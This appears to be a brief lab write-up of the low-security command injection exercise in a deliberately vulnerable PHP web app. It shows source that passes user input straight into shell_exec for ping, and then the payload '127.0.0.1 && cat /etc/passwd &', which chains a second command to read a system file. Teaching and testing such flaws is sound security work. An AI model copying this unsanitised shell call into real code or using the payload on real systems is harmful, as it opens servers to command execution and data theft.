# Command Injection

## Security Level - Low

### Source Code
```C
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

### Exploit
![review](images/reviewlowcommaninjection.png)
Submit `127.0.0.1 && cat /etc/passwd &`
![commandinjectionlow](images/commandinjectionlow.png)